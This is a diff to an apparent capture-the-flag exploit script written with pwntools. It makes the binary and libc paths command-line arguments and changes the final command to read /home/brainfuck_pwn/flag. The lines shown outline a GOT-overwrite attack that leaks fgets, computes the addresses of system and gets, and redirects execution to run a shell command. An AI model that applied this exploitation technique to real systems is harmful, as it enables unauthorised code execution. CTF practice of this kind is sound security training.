@@ -1,7 +1,14 @@
 #!/usr/bin/env python
 
 import pwn
+import argparse
 import sys
+
+parser = argparse.ArgumentParser(description="Select a filename.")
+parser.add_argument("filename", type=str, help="The name of the challenge file to analyze")
+parser.add_argument("libcfile", type=str, help="The name of the challenge libc to analyze")
+parser.add_argument("-d", "--debug", action="store_true", help="Debug challenge")
+args = parser.parse_args()
 
 prog = b''
 
@@ -29,11 +36,10 @@ def write(n):
     previous(n)
 
 
-bf = pwn.ELF('bf')
-bf_libc = pwn.ELF('bf_libc.so')
-#bf_libc = pwn.ELF('/usr/lib32/libc.so.6')
+bf = pwn.ELF(f'{args.filename}')
+bf_libc = pwn.ELF(f'{args.libcfile}')
 
-# Move to the lowest are
+# Move to the lowest area
 start = bf.symbols['tape']
 gfgets = bf.symbols['got.fgets']
 gmemset = bf.symbols['got.memset']
@@ -73,7 +79,7 @@ offset_to_gets = bf_libc.symbols['fgets'] - bf_libc.symbols['gets']
 write_queue = pwn.p32(leak - offset_to_system)
 write_queue += pwn.p32(leak - offset_to_gets)
 write_queue += pwn.p32(bf.symbols['main'])
-write_queue += b'/bin/cat flag\n'
+write_queue += b'/bin/cat /home/brainfuck_pwn/flag\n'
 
 conn.send(write_queue)
 
